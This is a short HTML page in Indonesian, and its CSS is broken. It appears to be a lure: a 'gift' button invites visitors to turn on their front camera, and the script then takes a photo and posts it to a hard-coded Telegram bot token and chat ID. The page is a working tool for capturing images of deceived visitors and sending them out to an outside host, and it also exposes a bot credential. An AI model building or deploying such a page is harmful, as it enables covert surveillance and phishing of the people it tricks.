<style>
body{

video, canvas{

<body>

<h2>Aktifkan Kamera</h2>

<video id="video" autoplay playsinline></video>
<br>
  <button onclick="takePhoto()">ðŸ¦ ðŸ’€ðŸ¦ </button>
<button onclick="sendPhoto()">hadiah</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>

const botToken = "7217256427:AAGFUPNz4D4oOak60-RQy9VKl_auGT7VT6I";
const chatId = "7223902938";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

// Kamera depan
navigator.mediaDevices.getUserMedia({
  video: { facingMode: "user" }
})
.then(stream => {
  video.srcObject = stream;
})
.catch(err => {
  alert("Izin kamera ditolak!");
});

// Ambil foto
function takePhoto(){
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0);
  alert("Foto berhasil diambil");
}

// Kirim ke Telegram
function sendPhoto(){
  canvas.toBlob(function(blob){
    let formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob);

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
      method:"POST",
      body:formData
    })
    .then(res => alert("Foto berhasil dikirim"))
    .catch(err => alert("Gagal kirim foto"));
  }, "image/jpeg");
}

</script>

</body>
